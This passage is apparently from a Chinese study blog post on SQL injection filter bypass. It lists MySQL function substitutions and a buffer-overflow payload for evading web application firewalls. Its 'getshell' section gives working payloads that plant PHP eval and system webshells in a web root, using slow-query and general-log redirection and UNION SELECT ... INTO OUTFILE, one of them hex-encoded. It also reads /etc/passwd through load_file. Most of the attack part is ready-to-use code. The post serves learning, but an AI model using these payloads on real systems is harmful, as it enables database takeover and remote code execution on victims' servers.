+<h3 id="2）ascii-–-hex-、bin-，替代之后再使用对应的进制转string即可"><a href="#2）ascii-–-hex-、bin-，替代之后再使用对应的进制转string即可" class="headerlink" title="2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可"></a>2）ascii()–&gt;hex()、bin()，替代之后再使用对应的进制转string即可</h3><h3 id="3）group-concat-–-concat-ws-，第一个参数为分隔符"><a href="#3）group-concat-–-concat-ws-，第一个参数为分隔符" class="headerlink" title="3）group_concat()–&gt;concat_ws()，第一个参数为分隔符"></a>3）group_concat()–&gt;concat_ws()，第一个参数为分隔符</h3><p>eg：<code>mysql&gt; select concat_ws(&quot;,&quot;,&quot;str1&quot;,&quot;str2&quot;)</code></p>
+<h3 id="4）substr-substring-mid-可以相互取代-取子串的函数还有left-right"><a href="#4）substr-substring-mid-可以相互取代-取子串的函数还有left-right" class="headerlink" title="4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()"></a>4）substr(),substring(),mid()可以相互取代, 取子串的函数还有left(),right()</h3><h3 id="5）user-–-user、datadir–-datadir"><a href="#5）user-–-user、datadir–-datadir" class="headerlink" title="5）user() –&gt; @@user、datadir–&gt;@@datadir"></a>5）user() –&gt; @@user、datadir–&gt;@@datadir</h3><h3 id="6）ord-–-ascii-这两个函数在处理英文时效果一样，但是处理中文等时不一致"><a href="#6）ord-–-ascii-这两个函数在处理英文时效果一样，但是处理中文等时不一致" class="headerlink" title="6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致"></a>6）ord()–&gt;ascii():这两个函数在处理英文时效果一样，但是处理中文等时不一致</h3><h2 id="13-缓冲区溢出"><a href="#13-缓冲区溢出" class="headerlink" title="13.缓冲区溢出"></a>13.缓冲区溢出</h2><p>缓冲区溢出用于对付WAF，有不少WAF是C语言写的，而C语言自身没有缓冲区保护机制，因此如果WAF在处理测试向量时超出了其缓冲区长度，就会引发bug从而实现绕过</p>
+<p>eg：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">?id=<span class="hljs-number">1</span> and <span class="hljs-punctuation">(</span>select <span class="hljs-number">1</span><span class="hljs-punctuation">)</span>=<span class="hljs-punctuation">(</span>Select <span class="hljs-number">0</span>xA*<span class="hljs-number">1000</span><span class="hljs-punctuation">)</span>+UnIoN+SeLeCT+<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,version<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,database<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,user<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>,<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>,<span class="hljs-number">13</span>,<span class="hljs-number">14</span>,<span class="hljs-number">15</span>,<span class="hljs-number">16</span>,<span class="hljs-number">17</span>,<span class="hljs-number">18</span>,<span class="hljs-number">19</span>,<span class="hljs-number">20</span>,<span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">24</span>,<span class="hljs-number">25</span>,<span class="hljs-number">26</span><br></code></pre></td></tr></table></figure>
+
+
+<p>示例0xA*1000指0xA后面”A”重复1000次，一般来说对应用软件构成缓冲区溢出都需要较大的测试长度，这里1000只做参考，在某些情况下可能不需要这么长也能溢出</p>
+<p>原文链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/zkaqlaoniao/article/details/120948100">https://blog.csdn.net/zkaqlaoniao/article/details/120948100</a></p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>sql查询语句是能够写入文件的，前提是<code>secure_file_priv</code>&#x3D;’’（为空）</p>
+<p>同时需要你有写入的权限，并且数据库中没有这个文件(不支持覆盖文件)，此时就可以写入了</p>
+<p>语句如下</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-keyword">SELECT</span> <span class="hljs-string">&#x27;Hello, World!&#x27;</span> <span class="hljs-keyword">INTO</span> OUTFILE <span class="hljs-string">&#x27;/path/to/file.txt&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>这就是一个简单的写文件语句，可以看到最核心的点就是INTO OUTFILE，是可以写文件到某个特定的目录</p>
+<h3 id="写木马到网站根目录"><a href="#写木马到网站根目录" class="headerlink" title="写木马到网站根目录"></a>写木马到网站根目录</h3><p>那么很容易理解第一个getshell的方法就是<strong>写木马文件到网站根目录</strong></p>
+<h3 id="写木马到日志文件"><a href="#写木马到日志文件" class="headerlink" title="写木马到日志文件"></a>写木马到日志文件</h3><h4 id="慢查询日志参数修改getshell"><a href="#慢查询日志参数修改getshell" class="headerlink" title="慢查询日志参数修改getshell"></a>慢查询日志参数修改getshell</h4><p>然后就是<strong>慢查询日志参数修改getshell</strong></p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">show global variables like &#x27;%slow%&#x27; # 查看所有慢查询相关的参数  </span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">set global slow_query_log=1 		# 打开慢日志</span><br><span class="language-xml"></span><br><span class="language-xml">set global slow_query_log_file=&#x27;C:\\phpStudy\\WWW\\test.php&#x27;	# 指定慢查询日志的路径为 Web 根目录下的 `test.php`，且路径写法必须是 **双反斜杠**，是 Windows 下文件路径要求。 </span><br><span class="language-xml"></span><br><span class="language-xml">SELECT &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; or sleep(11)		# 这儿11是超过慢日志的10秒时间</span><br></code></pre></td></tr></table></figure>
+
+<p>这个原理就是利用超时来吧木马写入我们自己指定路径的慢查询日志文件</p>
+<h4 id="general-log来getshell"><a href="#general-log来getshell" class="headerlink" title="general_log来getshell"></a>general_log来getshell</h4><p>利用普通查询日志也能进行</p>
+<p>相关参数一共有3个：general_log、log_output、general_log_file</p>
+<h6 id="1-确保日志开启"><a href="#1-确保日志开启" class="headerlink" title="1.确保日志开启"></a>1.确保日志开启</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;general_log&#x27;</span>;   # 查看日志是否开启<br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log=<span class="hljs-keyword">on</span>;   # 开启日志功能， MySQL 把执行的 <span class="hljs-keyword">SQL</span> 语句全部记录下来<br></code></pre></td></tr></table></figure>
+
+<h6 id="2-确定日志位置"><a href="#2-确定日志位置" class="headerlink" title="2.确定日志位置"></a>2.确定日志位置</h6><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs csharp">show variables like <span class="hljs-string">&#x27;general_log_file&#x27;</span>;    <span class="hljs-meta"># 看看日志文件保存位置</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file=<span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;   <span class="hljs-meta"># 设置日志文件保存位置</span><br></code></pre></td></tr></table></figure>
+
+<h6 id="3-确保日志写入的是文件，而不是表"><a href="#3-确保日志写入的是文件，而不是表" class="headerlink" title="3.确保日志写入的是文件，而不是表"></a>3.确保日志写入的是文件，而不是表</h6><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;log_output&#x27;</span>;  <span class="hljs-comment">-- 看看日志输出类型  table或file</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> log_output<span class="hljs-operator">=</span><span class="hljs-string">&#x27;table&#x27;</span>; <span class="hljs-comment">-- 设置输出类型为 table</span><br><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> log_output<span class="hljs-operator">=</span><span class="hljs-string">&#x27;file&#x27;</span>;   <span class="hljs-comment">-- 设置输出类型为file</span><br><br>一般log_output都是file,就是将日志存入文件中。<span class="hljs-keyword">table</span>的话就是将日志存入数据库的日志表中。<br></code></pre></td></tr></table></figure>
+
+<h6 id="4-写入木马"><a href="#4-写入木马" class="headerlink" title="4.写入木马"></a>4.写入木马</h6><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">set global general_log=&#x27;on&#x27;;</span><br><span class="language-xml"></span><br><span class="language-xml">set global general_log_file=&#x27;C:/phpStudy/WWW/shell.php&#x27;</span><br><span class="language-xml"></span><br><span class="language-xml">select &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pwd&#x27;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="into-outfile方法getshell"><a href="#into-outfile方法getshell" class="headerlink" title="into outfile方法getshell"></a>into outfile方法getshell</h4><p>相比于日志写shell，这个还需清楚网站的根目录</p>
+<p>1.收集信息，得到注入语句</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">email</span>=admin&#x27;			    #(报错)<br><br><span class="hljs-attribute">email</span>=admin&#x27; #  			#(不报错)<br><br><span class="hljs-attribute">email</span>=admin&#x27; or &#x27;<span class="hljs-number">1</span>&#x27; #		# 成功登入<br><br><span class="hljs-attribute">email</span>=admin&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> #<br><br><span class="hljs-attribute">email</span>=admin&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span> #<br><br><span class="hljs-attribute">email</span>=admin&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,database(),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> #<br><br><span class="hljs-attribute">email</span>=admin&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,user(),<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> #<br><br><span class="hljs-attribute">email</span>=admin&#x27; union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,@@version,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> #<br></code></pre></td></tr></table></figure>
+
+<h6 id="2-写入木马"><a href="#2-写入木马" class="headerlink" title="2. 写入木马"></a>2. 写入木马</h6><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">email=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; union select 1,2,3,load_file(&#x27;</span>/etc/passwd<span class="hljs-string">&#x27;),5,6,7,8 #证明 有 `FILE` 权限 ，否则 INTO OUTFILE，load_file() 会报错  </span><br><span class="hljs-string"></span><br><span class="hljs-string">email=admin&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,&quot;&lt;?php system($_POST[&#x27;x&#x27;]);?&gt;&quot;,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/sqli_shell.php&#x27;</span>#<br><br>或者<br><br><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>  <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;/var/www/html/shell.php&#x27;</span> #<br><br>email=<span class="hljs-keyword">admin</span><span class="hljs-string">&#x27; union select 1,2,3,load_file(&#x27;</span>/var/www/sqli_shell.php<span class="hljs-string">&#x27;),5,6,7,8 #</span><br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/web%E5%AD%A6%E4%B9%A0/" class="category-chain-item">web学习</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/web/" class="print-no-link">#web</a>
+      
+        <a href="/tags/SQL/" class="print-no-link">#SQL</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>sql注入绕过姿势</div>
+      <div>https://kivvs.github.io/2026/08/14/sql注入绕过姿势/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>kivvs</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年8月14日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/08/14/%E5%88%9D%E5%AD%A6xss/" title="初学xss">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">初学xss</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/08/14/sql%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%A6%81/" title="sql学习概要">
+                        <span class="hidden-mobile">sql学习概要</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+    <div id="giscus" class="giscus"></div>
+    <script type="text/javascript">
+      Fluid.utils.loadComments('#giscus', function() {
+        var options = {"repo":"kivvs/kivvs.github.io","repo-id":"R_kgDOT3J6Jg","category":"Announcements","category-id":"DIC_kwDOT3J6Js4DDSMc","theme-light":"light","theme-dark":"dark","mapping":"pathname","reactions-enabled":1,"emit-metadata":0,"input-position":"top","lang":"zh-CN"};
+        var attributes = {};
+        for (let option in options) {
+          if (!option.startsWith('theme-')) {
+            var key = option.startsWith('data-') ? option : 'data-' + option;
+            attributes[key] = options[option];
+          }
+        }
+        var light = 'light';
+        var dark = 'dark';
+        window.GiscusThemeLight = light;
+        window.GiscusThemeDark = dark;
+        attributes['data-theme'] = document.documentElement.getAttribute('data-user-color-scheme') === 'dark' ? dark : light;
+        for (let attribute in attributes) {
+          var value = attributes[attribute];
+          if (value === undefined || value === null || value === '') {
+            delete attributes[attribute];
+          }
+        }
+        var s = document.createElement('script');
+        s.setAttribute('src', 'https://giscus.app/client.js');
+        s.setAttribute('crossorigin', 'anonymous');
+        for (let attribute in attributes) {
+          s.setAttribute(attribute, attributes[attribute]);
+        }
+        var ss = document.getElementsByTagName('script');
+        var e = ss.length > 0 ? ss[ss.length - 1] : document.head || document.documentElement;
+        e.parentNode.insertBefore(s, e.nextSibling);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid- /hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/openkounter.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
